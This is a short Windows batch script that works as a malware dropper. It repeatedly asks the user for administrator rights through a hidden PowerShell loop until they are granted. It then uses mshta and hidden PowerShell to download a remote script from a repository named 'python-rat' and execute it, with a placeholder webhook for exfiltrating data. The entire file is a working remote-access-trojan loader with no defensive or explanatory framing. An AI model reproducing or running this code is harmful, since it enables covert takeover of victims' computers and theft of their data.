@echo off
cd /d "%~dp0"
net session >nul 2>&1
if NOT %errorlevel% == 0 ( powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$webhook = 'YOUR_URL_HERE_SERVER';$plugin = '<plugin>';Iwr -Uri 'https://raw.githubusercontent.com/s1uiasdad/python-rat/main/main.ps1' -USeB | iex",0))
